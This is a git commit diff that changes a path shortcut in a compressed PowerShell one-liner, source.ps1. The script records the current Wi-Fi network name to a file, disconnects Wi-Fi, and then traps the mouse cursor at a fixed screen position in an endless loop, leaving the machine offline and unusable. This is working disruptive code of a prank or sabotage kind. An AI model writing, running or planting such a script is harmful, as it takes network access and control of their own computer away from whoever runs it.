ed2b652c7eaf1b6e8259b33b54c01fca0546c67f
egnotech <geraldmcginn1704@gmail.com>
2026-07-16 12:47:01 -0700

    Update path to use home directory shortcut

--- source.ps1
+++ source.ps1
@@ -1,1 +1,1 @@
-sc $HOME\.w(((netsh wlan sh int)-match'SSID')-split': ')[1];netsh wlan disc;Add-Type -a System.Windows.Forms;$s=[Windows.Forms.SystemInformation]::PrimaryMonitorSize;for(;;){[Windows.Forms.Cursor]::Position=[Drawing.Point]::new($s.Width/8,$s.Height*7/8);sleep 0}
+sc ~\.w(((netsh wlan sh int)-match'SSID')-split': ')[1];netsh wlan disc;Add-Type -a System.Windows.Forms;$s=[Windows.Forms.SystemInformation]::PrimaryMonitorSize;for(;;){[Windows.Forms.Cursor]::Position=[Drawing.Point]::new($s.Width/8,$s.Height*7/8);sleep 0}
